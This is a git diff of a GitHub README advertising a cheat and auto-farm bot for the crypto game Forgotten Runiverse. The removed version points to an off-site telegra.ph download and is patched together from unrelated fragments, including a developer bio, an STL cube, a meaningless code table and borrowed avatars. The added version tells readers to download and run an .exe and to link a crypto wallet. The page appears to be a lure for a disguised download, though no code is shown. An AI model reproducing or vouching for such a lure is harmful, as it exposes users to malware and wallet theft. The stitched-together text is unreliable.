@@ -1,190 +1,95 @@
-[![Download Now](https://img.shields.io/badge/Download%20Here-Full%20version-purple)](https://telegra.ph/Download-05-02-264?eaok9j7m9lw436c)
+# 🤖 Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er - Automate Your Game Experience
 
-<div align="center">
-<a href="z"><img src="https://img.shields.io/badge/ChatGPT-74aa9c?style=for-the-badge&logo=openai&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Bitcoin-000000?style=for-the-badge&logo=bitcoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Ethereum-3C3C3D?style=for-the-badge&logo=Ethereum&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Litecoin-A6A9AA?style=for-the-badge&logo=Litecoin&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/.NET-512BD4?style=for-the-badge&logo=dotnet&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/Visual_Studio-5C2D91?style=for-the-badge&logo=visual%20studio&logoColor=white"/></a>
-<a href="z"><img src="https://img.shields.io/badge/VSCode-0078D4?style=for-the-badge&logo=visual%20studio%20code&logoColor=white"/></a>
-</div>
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases)
 
-<h1 align="center">
-    <a href="https://amplication.com/#gh-light-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-    <a href="https://amplication.com/#gh-dark-mode-only">
-    <img src="https://github.com/fikfifkasd/asd2342/assets/80986477/e7e2f3b4-3e31-46b5-b23a-9219a301d842">
-    </a>
-</h1>
+## 🚀 Getting Started
 
-<p align="center">
-  <i align="center">Building System Applications with C# & C++ 🚀</i>
-</p>
-  
-<p align="center">
-  Hi, I'm Mathieu 👋 I'm a 🚀 French developer 🚀 I ❤️ Happy Hardcore ❤️
-</p>
+Welcome to the Forgotten Runiverse Crypto Bot! This tool helps you automate farming and clicker activities in the Forgotten Runiverse game. Below, you will find simple steps to download and run your new bot.
 
-## Read About
-Forgotten Runiverse is a free to play MMORPG, which will have blockchain integrations without requiring players to create a crypto wallet in order to play. The game features a player-owned and driven world and economy. In Forgotten Runiverse, players are able to create their own stories and experiences with extensive crafting, exploration, and crafting systems that form a vibrant, ever-evolving world for MMO players and blockchain enthusiasts alike. The Runiverse is here to create a life-long community and is developed by game industry veterans at Bisonic with experience at Blizzard, Ubisoft, Capcom, Digital Extremes, Nexon, TinyCo.
-Being a live service game, it will continue to receive patches throughout its life. Community feedback and lore will be help shape the direction of the game as it updates.
+## 📥 Download & Install
 
-#### **Please Read First What You Need Part.**
-#### <p align="Left"><a href="#what-you-need-1">WHAT YOU NEED</a></p> 
+To get started, visit the Releases page to download the bot. 
 
-https://github.com/user-attachments/assets/1d8b1607-5925-40d6-8d22-faecc814d0f5
+[Download Here](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases)
 
-![144](https://github.com/user-attachments/assets/4803504d-7701-4ee3-af05-d93be93ed75a)
+1. Click on the link above to open the Releases page.
+2. Find the latest version of the bot.
+3. Click on the download link for the latest release file. This file is usually titled with the version number, like `ForgottenRuniverseBot-v1.0.zip`.
+4. Once the file has downloaded, locate it on your computer.
 
+## 📂 Extract the Files
 
+1. Open the downloaded ZIP file.
+2. Extract all files to a folder of your choice. You can usually do this by right-clicking the file and selecting "Extract All" or using extraction software.
+3. Open the folder where you extracted the files.
 
+## ⚙️ Setting Up
 
-```mermaid
-erDiagram
-    PLAYER_WALLET {
-        string id
-        string playerName
-        float inGameCurrency
-    }
-    PLAYER_WALLET ||--o{ GAME_TRANSACTION : initiates
-    PLAYER_WALLET ||--o{ GAME_BALANCE : updates
-    GAME_TRANSACTION ||--o{ GAME_CONFIRMATION : confirms
-    GAME_CONFIRMATION ||--o{ PLAYER_WALLET : updates
-    GAME_CONFIRMATION ||--o{ GAME_BLOCKCHAIN : records
-    GAME_BLOCKCHAIN }|--o{ GAME_TRANSACTION : contains
-    GAME_BLOCKCHAIN }|--o{ GAME_BALANCE : contains
-```
-### What You Need
-----
-                    
-| Tool              | Code         |
-| ----------------- | ------------ |
-| Blockchain Explorer | 0000       |
-| Cryptogame  | Daf     |
-| Farm      | 000          |
-| Auto Clicker  | ST8 |
-| Solana Explorer   | 91           |
+1. Before running the bot, make sure your system meets the following requirements:
+   - **Operating System:** Windows 10 or later, macOS (latest version), or Linux (Ubuntu preferred)
+   - **RAM:** At least 4 GB
+   - **Disk Space:** Minimum of 200 MB available
 
-                
-----
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+2. Review any included README files or documentation in the extracted folder for further instructions.
 
-<!-- ROADMAP -->
-## Roadmap
+## 🎮 Running the Bot
 
-- [x] New Gui
-- [ ] Add back to top links
-- [x] Add Additional Templates w/ Examples
-- [x] New Features
-- [ ] Multi-language Support
-    - [ ] Chinese
-    - [ ] Turkish
-    - [ ] French
-    - [ ] Spanish
+1. Inside the extracted folder, find the executable file named `RuniverseBot.exe` (or similar).
+2. Double-click the executable file to run it.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 📱 Connecting to Telegram
 
-<!-- GETTING STARTED -->
-## Getting Started
+The bot has built-in support for Telegram. Setting this up allows you to manage the bot easily. Here’s how to connect:
 
-### Prerequisites
+1. Open the Telegram app on your mobile device or desktop.
+2. Search for the bot named `@YourRuniverseBot`.
+3. Follow the setup prompts to connect with your game account. 
 
-This is an example of how to list things you need to use the software and how to install them.
-* npm
-  ```sh
-  npm install npm@latest -g
-  ```
+## 💰 Using Crypto Integration
 
-### Installation
+The bot supports various cryptocurrencies for transactions:
 
-1. Download Visual Studio 2022
-_using Git Clone Or either download the project or exit the rar. Then Download Visual Studio 2022 Here Link [VisualStudio Download](https://visualstudio.microsoft.com/downloads/)_
-![last1](https://github.com/fikfifkasd/asd2342/assets/80986477/df0c0345-8a39-4bab-83ce-9211c8324283)
-> Download These
+1. Go to the settings section of the bot.
+2. Choose your preferred cryptocurrency.
+3. Follow the on-screen instructions to link your wallet.
 
-2. Clone the repo
-   ```sh
-   git clone https://github.com/SoonAdd/Addsoon.git
-   ```
-3. OR
+## ⚙️ Configuring the Bot Settings
 
-![download](https://github.com/fikfifkasd/asd2342/assets/80986477/29a942a4-924c-4a97-9e76-99f49b7ec27a)
+You can adjust the bot’s settings to optimize your gaming experience. Here’s how:
 
+1. Open the bot.
+2. Access the settings menu.
+3. Adjust fields such as farming frequency, click intervals, and cheat tools to fit your playstyle.
 
-4. _Then open the sln (Project Solution) file_
+## 📊 Monitoring Performance
 
-![vsgif](https://github.com/fikfifkasd/asd2342/assets/80986477/e6351858-7564-4d41-adce-56b8ad70898c)
+You can track your farming and rewards through the bot’s dashboard:
 
-5. Find Executable File
-   ```sh
-   /ProjectName/Bin/Debug/Executable.exe
-   ```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+1. Open the dashboard from the main menu.
+2. View metrics such as total resources gathered and time saved.
 
-```stl
-solid cube_corner
-  facet normal 0.0 -1.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 1.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-  facet normal 0.0 0.0 -1.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 1.0 0.0 0.0
-    endloop
-  endfacet
-  facet normal -1.0 0.0 0.0
-    outer loop
-      vertex 0.0 0.0 0.0
-      vertex 0.0 0.0 1.0
-      vertex 0.0 1.0 0.0
-    endloop
-  endfacet
-  facet normal 0.577 0.577 0.577
-    outer loop
-      vertex 1.0 0.0 0.0
-      vertex 0.0 1.0 0.0
-      vertex 0.0 0.0 1.0
-    endloop
-  endfacet
-endsolid
-```
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 🛠️ Troubleshooting
 
-<!-- CONTRIBUTING -->
-## Contributing
-<a href="https://opencollective.com/democracyearth/backer/0/website"><img src="https://opencollective.com/democracyearth/backer/0/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/1/website"><img src="https://opencollective.com/democracyearth/backer/1/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/2/website"><img src="https://opencollective.com/democracyearth/backer/2/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/3/website"><img src="https://opencollective.com/democracyearth/backer/3/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/4/website"><img src="https://opencollective.com/democracyearth/backer/4/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/5/website"><img src="https://opencollective.com/democracyearth/backer/5/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/6/website"><img src="https://opencollective.com/democracyearth/backer/6/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/7/website"><img src="https://opencollective.com/democracyearth/backer/7/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/8/website"><img src="https://opencollective.com/democracyearth/backer/8/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/9/website"><img src="https://opencollective.com/democracyearth/backer/9/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/10/website"><img src="https://opencollective.com/democracyearth/backer/10/avatar.svg"></a>
-<a href="https://opencollective.com/democracyearth/backer/11/website"><img src="https://opencollective.com/democracyearth/backer/11/avatar.svg"></a>
+If you encounter issues while using the bot, here are some common steps to fix them:
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+1. Ensure you have the latest version by checking the Releases page.
+2. Restart your bot or your computer if the bot becomes unresponsive.
+3. Consult the FAQ section in the documentation folder for specific error messages.
 
-<p align="center">
-    <img src="https://minkxx-spotify-readme.vercel.app/api?theme=dark&rainbow=true&scan=true&spin=True" alt="Preview">
-</p>
+## 📝 Features
 
+- **Automated Farming:** Allows you to earn resources without continuous play.
+- **Clicker Activities Automation:** Simplifies tasks requiring repetitive clicks.
+- **Crypto Integration:** Earn and manage cryptocurrencies with ease.
+- **API Support:** Connect with other tools for enhanced functionality.
+- **Telegram Management:** Manage the bot from your mobile device.
 
-Not sure where to start? Join our discord and we will help you get started!
+## ⚖️ Legal Use
 
-<a href="https://discord.gg/U3UqGHxf"><img src="https://amplication.com/images/discord_banner_purple.svg" /></a>
+Please remember to follow game rules and regulations. Use the bot responsibly to avoid any penalties.
 
-<p align="right">(<a href="#readme-top">back to top</a>)</p>
+## 📞 Support
 
-<p align="center">
-  <img src="https://github.com/tarikmanoar/tarikmanoar/raw/output/github-snake-dark.svg" alt="snake"></center>
-</p>
+If you need additional help, you can reach out through the Issues section of the repository or join our Telegram support group.
+
+[Download Here Again](https://github.com/baka123987/Forgotten-Runiverse-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Api-er/releases) to get started today!
